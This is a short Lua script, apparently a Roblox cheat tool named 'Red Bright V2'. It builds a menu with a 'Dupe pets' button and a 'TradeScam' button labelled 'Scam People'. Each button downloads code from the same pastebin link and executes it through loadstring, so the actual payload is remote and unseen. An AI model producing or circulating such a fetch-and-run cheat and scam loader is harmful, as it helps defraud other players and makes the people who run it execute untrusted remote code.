local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Red Bright V2", "DarkTheme")

--Dupe
local Dupe = Window:NewTab("Dupe")
local DupeSection = Dupe:NewSection("Dupe")


DupeSection:NewButton("Dupe pets", "Dupes all your pets", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/JgyjdR6y'))()
end)

--Trade Scam
local TradeScam = Window:NewTab("TradeScam")
local TradeScamSection = TradeScam:NewSection("TradeScam")


TradeScamSection:NewButton("TradeScam", "Scam People", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/JgyjdR6y'))()
end)
